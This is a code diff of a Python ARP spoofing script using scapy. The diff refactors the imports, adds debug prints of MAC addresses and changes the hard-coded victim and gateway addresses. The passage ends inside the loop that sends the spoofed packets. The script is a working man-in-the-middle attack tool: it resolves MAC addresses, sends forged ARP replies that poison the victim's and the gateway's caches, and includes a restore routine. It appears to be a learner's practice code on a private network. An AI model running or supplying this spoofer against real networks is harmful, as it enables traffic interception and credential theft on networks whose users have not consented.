@@ -2,33 +2,38 @@
 import sys
 import time
 
-import scapy.all as scapy
-import scapy.layers.l2 as scapy_a
+from scapy.all import srp, send
+from scapy.layers import l2
 
 
 def get_mac(ip):
-    arp_request = scapy_a.ARP(pdst=ip)
-    broadcast = scapy_a.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request = l2.ARP(pdst=ip)
+    broadcast = l2.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy_a.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+    # print("---- Length: " + str(len(str(answered_list))))
+    # print(str(ls(answered_list[0][1])) + "\n\n")
     return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    print("---- target_mac: "+target_mac)
+    packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
 
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
+    print("---- destination_mac: "+destination_mac)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    print("---- source_mac: "+source_mac)
+    packet = l2.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    send(packet, verbose=False)
 
 
-victim_ip = "192.168.49.135"
-gateway_ip = "192.168.49.2"
+victim_ip = "192.168.0.7"
+gateway_ip = "192.168.0.1"
 try:
     packet_sent_count = 0
     while True:
